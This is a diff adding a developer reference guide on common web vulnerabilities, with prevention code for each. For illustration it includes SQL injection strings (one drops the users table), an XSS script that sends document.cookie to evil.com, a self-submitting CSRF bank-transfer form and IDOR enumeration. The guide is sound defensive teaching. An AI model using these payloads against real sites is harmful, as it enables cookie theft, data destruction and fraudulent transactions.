@@ -1,0 +1,509 @@
+<article>
+
+# Web Security Vulnerabilities - Developer Reference Guide
+
+A practical guide to common web security vulnerabilities, how they work, and how to prevent them.
+
+---
+
+## Table of Contents
+
+1. [SQL Injection](#1-sql-injection)
+2. [XSS (Cross-Site Scripting)](#2-xss-cross-site-scripting)
+3. [CSRF (Cross-Site Request Forgery)](#3-csrf-cross-site-request-forgery)
+4. [Network Sniffing (Man-in-the-Middle)](#4-network-sniffing-man-in-the-middle)
+5. [Broken Authentication](#5-broken-authentication)
+6. [Sensitive Data Exposure](#6-sensitive-data-exposure)
+7. [Insecure Direct Object References (IDOR)](#7-insecure-direct-object-references-idor)
+8. [Security Misconfiguration](#8-security-misconfiguration)
+9. [Cookie Security Flags Cheat Sheet](#9-cookie-security-flags-cheat-sheet)
+10. [Quick Reference Table](#10-quick-reference-table)
+
+---
+
+## 1. SQL Injection
+
+### What is it?
+
+Attacker injects malicious SQL code through user input, manipulating your database queries.
+
+### How it works
+
+**Vulnerable code:**
+
+```javascript
+// ❌ DANGEROUS - String concatenation
+const query = `SELECT * FROM users WHERE email = '${userInput}'`;
+```
+
+**Attack:**
+
+```
+User input: ' OR '1'='1' --
+
+Resulting query:
+SELECT * FROM users WHERE email = '' OR '1'='1' --'
+
+'1'='1' is always true → Returns ALL users
+-- comments out the rest → Bypasses any other conditions
+```
+
+**Destructive attack:**
+
+```
+User input: '; DROP TABLE users; --
+
+Resulting query:
+SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
+
+→ First query runs (empty result)
+→ Second query DELETES YOUR ENTIRE USERS TABLE
+```
+
+### Prevention
+
+```javascript
+// ✅ SAFE - Use parameterized queries / prepared statements
+// The database treats input as DATA, not as SQL code
+
+// Drizzle ORM (what we use)
+const result = await db.select().from(users).where(eq(users.email, userInput)); // Automatically parameterized
+
+// Raw SQL with parameters
+const result = await db.execute(sql`SELECT * FROM users WHERE email = ${userInput}`);
+
+// Node.js pg library
+const result = await pool.query(
+	'SELECT * FROM users WHERE email = $1',
+	[userInput] // Parameter passed separately
+);
+```
+
+### Types of SQL Injection
+
+| Type            | Description                                                |
+| --------------- | ---------------------------------------------------------- |
+| **Classic**     | Direct output shown (error messages, data)                 |
+| **Blind**       | No direct output, attacker infers via true/false responses |
+| **Time-based**  | Attacker uses `SLEEP()` to confirm injection works         |
+| **Union-based** | Uses `UNION` to extract data from other tables             |
+
+### Real-world analogy
+
+> Imagine a form where you write your name on a whiteboard.  
+> Instead of writing "John", you write: `John"; ERASE EVERYTHING; "`  
+> If the system blindly copies your input, it erases the whole board.
+
+---
+
+## 2. XSS (Cross-Site Scripting)
+
+### What is it?
+
+Similar to [SQL Injection](#1-sql-injection), but instead of injecting code into your **database**, the attacker injects malicious JavaScript into your **website**. When other users view the page, the script runs in their browser.
+
+| Attack        | Injection Target | Executes On      |
+| ------------- | ---------------- | ---------------- |
+| SQL Injection | Database query   | Your server      |
+| XSS           | Web page         | Victim's browser |
+
+### How it works
+
+**Scenario:** Your site has a comment section that doesn't sanitize input.  
+Attacker posts this "comment":
+
+```javascript
+<script>fetch('https://evil.com/steal?cookie=' + document.cookie);</script>
+```
+
+When any user views the page:  
+→ Script executes in their browser  
+→ Their cookies/data sent to attacker
+
+### Types of XSS
+
+| Type              | Description                                                  | Example                         |
+| ----------------- | ------------------------------------------------------------ | ------------------------------- |
+| **Stored XSS**    | Malicious script saved in database, executed when page loads | Comment section, user profiles  |
+| **Reflected XSS** | Script in URL, executed when victim clicks malicious link    | `site.com/search?q=<script>...` |
+| **DOM-based XSS** | Script manipulates page's DOM directly                       | Vulnerable JavaScript on page   |
+
+### Prevention
+
+```javascript
+// ❌ DANGEROUS - Never do this
+element.innerHTML = userInput;
+document.write(userInput);
+
+// ✅ SAFE - Use text content
+element.textContent = userInput;
+
+// ✅ SAFE - Sanitize HTML if needed
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);
+
+// ✅ SAFE - Use frameworks that auto-escape
+// Svelte, React, Vue all escape by default
+<p>{userInput}</p>; // Automatically escaped
+```
+
+```javascript
+// ✅ Cookie protection - Use httpOnly
+cookies.set('token', value, {
+	httpOnly: true // JavaScript can't read this cookie
+});
+```
+
+### Real-world analogy
+
+> Imagine a bulletin board where anyone can post notes.  
+> Attacker posts a note with invisible ink that, when read, hypnotizes the reader into giving away their wallet.  
+> Every person who reads the board gets hypnotized.
+
+---
+
+## 3. CSRF (Cross-Site Request Forgery)
+
+### What is it?
+
+Attacker tricks your browser into making requests to a site where you're already logged in, using your existing session.
+
+### How it works
+
+```
+1. You login to bank.com → browser stores auth cookie
+2. You visit evil-site.com (in another tab, or via phishing email)
+3. Evil site has hidden code:
+
+   <img src="https://bank.com/transfer?to=attacker&amount=10000">
+
+   or
+
+   <form action="https://bank.com/transfer" method="POST">
+     <input name="to" value="attacker">
+     <input name="amount" value="10000">
+   </form>
+   <script>document.forms[0].submit();</script>
+
+4. Your browser: "Request to bank.com? I have cookie for that!"
+   → Automatically attaches your auth cookie
+
+5. Bank sees valid cookie → thinks it's you → executes transfer
+```
+
+**Key insight:** You never clicked anything on evil-site. Just loading the page was enough.
+
+### Prevention
+
+```javascript
+// ✅ Use sameSite cookie flag
+cookies.set('token', value, {
+  sameSite: 'strict',  // Cookie not sent on cross-origin requests
+});
+
+// ✅ Alternative: CSRF tokens
+// Server generates unique token per session
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="random-unique-abc123">
+  ...
+</form>
+
+// Server validates token matches session
+```
+
+### sameSite values explained
+
+| Value    | Behavior                                                            |
+| -------- | ------------------------------------------------------------------- |
+| `strict` | Cookie only sent if user is ON your site                            |
+| `lax`    | Cookie sent on same-site + top-level navigation (clicking links)    |
+| `none`   | Cookie always sent (requires `secure` flag, use for embeds/iframes) |
+
+### Real-world analogy
+
+> Your cookie is like a signed blank check.  
+> Without `sameSite`, anyone can mail that check from anywhere, and the bank honors it.  
+> With `sameSite=strict`, the bank only accepts checks you hand in personally.
+
+---
+
+## 4. Network Sniffing (Man-in-the-Middle)
+
+### What is it?
+
+Attacker intercepts data traveling between your computer and the server.
+
+### How it works
+
+**On public WiFi (HTTP):**
+
+```
+Your laptop ──────────────► Coffee shop router ──────────────► Internet
+              "accessToken=abc123"
+              "password=secret"
+                         ↑
+                    Attacker's laptop
+                    (same network)
+
+                    Running Wireshark/tcpdump
+                    Sees ALL your data in plain text
+```
+
+**With HTTPS:**
+
+```
+Your laptop ──────────────► Coffee shop router ──────────────► Internet
+              "x8#kL2$9@mN..."
+              (encrypted gibberish)
+                         ↑
+                    Attacker sees garbage
+                    Can't decrypt without private key
+```
+
+### Prevention
+
+```javascript
+// ✅ Use HTTPS everywhere
+// Force HTTPS redirect in your server
+
+// ✅ Cookie secure flag - only sent over HTTPS
+cookies.set('token', value, {
+	secure: true // Never sent over HTTP
+});
+
+// ✅ HSTS header - tell browser to always use HTTPS
+response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+```
+
+### Real-world analogy
+
+> HTTP is like sending a postcard - anyone who handles it can read it.  
+> HTTPS is like sending a sealed, tamper-proof envelope - only the recipient can open it.
+
+---
+
+## 5. Broken Authentication
+
+### What is it?
+
+Weaknesses in your authentication system that allow attackers to compromise accounts.
+
+### Common vulnerabilities
+
+| Vulnerability           | Description                             | Prevention                                |
+| ----------------------- | --------------------------------------- | ----------------------------------------- |
+| **Weak passwords**      | Users choose "123456"                   | Enforce password policies                 |
+| **No rate limiting**    | Attacker tries millions of passwords    | Limit login attempts (e.g., 5 per 15 min) |
+| **Credential stuffing** | Using leaked passwords from other sites | Require 2FA, check breach databases       |
+| **Session fixation**    | Attacker sets victim's session ID       | Regenerate session after login            |
+| **Predictable tokens**  | Sequential or guessable session IDs     | Use cryptographically random tokens       |
+
+### Prevention
+
+```javascript
+// ✅ Rate limiting on login
+const attempts = await redis.get(`login:${ip}`);
+if (attempts > 5) {
+	throw new Error('Too many attempts. Try again in 15 minutes.');
+}
+
+// ✅ Strong password hashing
+import { hash, verify } from '@node-rs/argon2';
+const hashedPassword = await hash(password); // Not MD5, not SHA1!
+
+// ✅ Cryptographically random tokens
+import { randomBytes } from 'crypto';
+const token = randomBytes(32).toString('hex'); // Not Math.random()!
+
+// ✅ Short-lived access tokens
+const accessToken = jwt.sign(payload, key, { expiresIn: '15m' });
+```
+
+---
+
+## 6. Sensitive Data Exposure
+
+### What is it?
+
+Accidentally exposing sensitive data through APIs, logs, or error messages.
+
+### Common mistakes
+
+```javascript
+// ❌ DANGEROUS - Returning password hash in API
+return { user: { id, email, hashedPassword } };
+
+// ❌ DANGEROUS - Logging sensitive data
+console.log('User login:', { email, password });
+
+// ❌ DANGEROUS - Detailed error messages in production
+catch (err) {
+  return { error: err.stack };  // Exposes internal structure
+}
+
+// ❌ DANGEROUS - Hardcoded secrets
+const apiKey = 'sk_live_abc123';  // In source code!
+```
+
+### Prevention
+
+```javascript
+// ✅ Select only needed fields
+const user = await db.query.users.findFirst({
+  columns: { id: true, email: true, name: true }
+  // hashedPassword NOT selected
+});
+
+// ✅ Use environment variables
+const apiKey = process.env.API_KEY;
+
+// ✅ Generic error messages in production
+catch (err) {
+  console.error(err);  // Log internally
+  return { error: 'Something went wrong' };  // Generic to user
+}
+
+// ✅ Never log passwords
+console.log('User login:', { email });  // password omitted
+```
+
+---
+
+## 7. Insecure Direct Object References (IDOR)
+
+### What is it?
+
+User can access other users' data by changing an ID in the URL or request.
+
+### How it works
+
+```
+Normal request:
+GET /api/invoices/123  ← Your invoice
+
+Attack:
+GET /api/invoices/124  ← Someone else's invoice (oops!)
+GET /api/invoices/125
+GET /api/invoices/126  ← Attacker iterates through all invoices
+```
+
+### Prevention
+
+```javascript
+// ❌ DANGEROUS - No authorization check
+app.get('/invoices/:id', async (req, res) => {
+	const invoice = await db.query.invoices.findFirst({
+		where: eq(invoices.id, req.params.id)
+	});
+	return invoice; // Anyone can get any invoice!
+});
+
+// ✅ SAFE - Check ownership
+app.get('/invoices/:id', async (req, res) => {
+	const invoice = await db.query.invoices.findFirst({
+		where: and(
+			eq(invoices.id, req.params.id),
+			eq(invoices.userId, req.user.id) // Must belong to current user
+		)
+	});
+
+	if (!invoice) {
+		throw new Error('Not found'); // Don't reveal if it exists
+	}
+
+	return invoice;
+});
+
+// ✅ Alternative - Use UUIDs instead of sequential IDs
+// Harder to guess: /invoices/550e8400-e29b-41d4-a716-446655440000
+```
+
+---
+
+## 8. Security Misconfiguration
+
+### What is it?
+
+Insecure default settings, missing security headers, exposed debug info.
+
+### Common issues
+
+| Issue                     | Risk                                | Fix                     |
+| ------------------------- | ----------------------------------- | ----------------------- |
+| Debug mode in production  | Exposes stack traces, internal info | `NODE_ENV=production`   |
+| Default credentials       | Admin/admin still works             | Change on first deploy  |
+| Directory listing enabled | Shows all files in folder           | Disable in web server   |
+| Missing security headers  | Various attacks                     | Add headers (see below) |
+| Unnecessary ports open    | More attack surface                 | Close unused ports      |
+
+### Security headers
+
+```javascript
+// Add these headers to your responses
+const securityHeaders = {
+	// Prevent clickjacking (embedding in iframe)
+	'X-Frame-Options': 'DENY',
+
+	// Prevent MIME type sniffing
+	'X-Content-Type-Options': 'nosniff',
+
+	// Enable browser XSS filter
+	'X-XSS-Protection': '1; mode=block',
+
+	// Control what resources can be loaded
+	'Content-Security-Policy': "default-src 'self'",
+
+	// Force HTTPS
+	'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+
+	// Control referrer information
+	'Referrer-Policy': 'strict-origin-when-cross-origin'
+};
+```
+
+---
+
+## 9. Cookie Security Flags Cheat Sheet
+
+```javascript
+cookies.set('token', value, {
+	httpOnly: true, // JS can't read (prevents XSS token theft)
+	secure: true, // HTTPS only (prevents network sniffing)
+	sameSite: 'strict', // Same-origin only (prevents CSRF)
+	path: '/', // Available on all paths
+	maxAge: 60 * 15 // Expires in 15 minutes
+});
+```
+
+| Flag              | Prevents         | How                                      |
+| ----------------- | ---------------- | ---------------------------------------- |
+| `httpOnly`        | XSS token theft  | JavaScript can't access cookie           |
+| `secure`          | Network sniffing | Cookie only sent over HTTPS              |
+| `sameSite=strict` | CSRF             | Cookie not sent on cross-origin requests |
+| Short `maxAge`    | Long-term damage | Token expires quickly                    |
+
+---
+
+## 10. Quick Reference Table
+
+| Attack               | Where it runs    | What attacker does                 | Prevention                         |
+| -------------------- | ---------------- | ---------------------------------- | ---------------------------------- |
+| **XSS**              | Victim's browser | Injects JavaScript                 | Sanitize input, `httpOnly` cookies |
+| **CSRF**             | Victim's browser | Tricks browser into requests       | `sameSite` cookies, CSRF tokens    |
+| **SQL Injection**    | Your database    | Injects SQL code                   | Parameterized queries              |
+| **Network Sniffing** | Network layer    | Reads unencrypted traffic          | HTTPS, `secure` cookies            |
+| **Broken Auth**      | Your auth system | Brute force, stolen creds          | Rate limiting, 2FA, strong hashing |
+| **Data Exposure**    | Your API/logs    | Finds leaked secrets               | Filter responses, env vars         |
+| **IDOR**             | Your API         | Changes IDs to access others' data | Authorization checks               |
+| **Misconfiguration** | Your server      | Exploits defaults                  | Harden settings, security headers  |
+
+---
+
+## Further Reading
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical security risks
+- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) - Detailed prevention guides
+- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
+- [Have I Been Pwned](https://haveibeenpwned.com/) - Check if credentials are breached
+
+</article>
